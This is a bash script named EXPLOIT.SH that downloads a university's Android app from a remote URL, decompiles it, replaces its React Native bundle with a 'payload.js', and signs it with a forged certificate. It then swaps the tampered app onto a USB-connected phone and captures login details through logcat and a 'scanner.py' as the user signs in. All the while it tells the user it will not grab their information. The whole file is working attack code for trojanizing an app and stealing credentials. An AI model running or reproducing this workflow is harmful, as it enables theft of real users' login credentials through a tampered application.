#!/bin/bash
#checking if you have all required commands
echo "EXPLOIT.SH - Checking of your toolchain is ready..."
command -v curl >/dev/null 2>&1 || { echo "cURL is required but it's not installed.  Aborting." >&2; exit 1; }
command -v apktool >/dev/null 2>&1 || { echo "apktool is required but it's not installed.  Aborting." >&2; exit 1; }
command -v keytool >/dev/null 2>&1 || { echo "keytool is required but it's not installed.  Aborting." >&2; exit 1; }
command -v jarsigner >/dev/null 2>&1 || { echo "jarsigner is required but it's not installed.  Aborting." >&2; exit 1; }
command -v adb >/dev/null 2>&1 || { echo "adb is required but it's not installed.  Aborting." >&2; exit 1; }
command -v zipalign >/dev/null 2>&1 || { echo "zipalign is required but it's not installed.  Aborting." >&2; exit 1; }

# Cleaning previous builds
echo "EXPLOIT.SH - Cleaning workbench..."
rm -rf app-release
rm -rf *.apk
rm -rf *.log
rm -rf *.keystore

echo -e  "Please make sure that you connected an Android device vÃ­a usb, and that you enabled debugging mode in order to patch the application before continuing.\nI won't patch anything on your phone nor grab any information of yours so don't worry. Trust me, I'm a dolphin.\n"
read -n1 -r -p "[PRESS ANY KEY TO CONTINUE]" key

# Grabbing original apk
echo "EXPLOIT.SH - Grabbing original APK..."
curl -o app-release.apk "http://www.ingenieria.utalca.cl/Repositorio/fxoRGugX2NwzD5UowUEFm1c6ShPZSv/app-release.apk"

# Decompiling apk
echo "EXPLOIT.SH - Decompiling APK..."
apktool d ./app-release.apk

# Replacing app-release bundle
echo "EXPLOIT.SH - Injecting payload on ReactNative application..."
rm ./app-release/assets/index.android.bundle
cp payload.js ./app-release/assets/index.android.bundle

echo "EXPLOIT.SH - Re-packaging apk..."
# Building modified version
apktool b app-release

# Optimizing apk
zipalign  -v 4 app-release/dist/app-release.apk app-release-aligned.apk

# Generating certificates
echo "EXPLOIT.SH - Faking apk signature..."
keytool \
    -genkey \
    -noprompt \
    -alias Testing \
    -dname "CN=flying.high, OU=ID, O=UTAL, L=AGG, S=AGG, C=CL" \
    -keystore Testing.keystore \
    -storepass password \
    -keypass password \
    -validity 10000

# Signing application
jarsigner \
    -keystore Testing.keystore \
    -storepass password \
    -verbose app-release-aligned.apk \
    Testing

# Replacing original application on mobile
echo "EXPLOIT.SH - Replacing original app on android device..."
adb uninstall com.utalcaapp
adb install app-release-aligned.apk

echo "EXPLOIT.SH - Hooking adb-logcat on background..."
adb logcat | grep --line-buffered HACK > adb_dump.log&

echo "EXPLOIT.SH - Scanning for login info. Please grab your android phone and log into the application."
python scanner.py

echo "EXPLOIT.SH - Scanning done. Goodbye!"
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT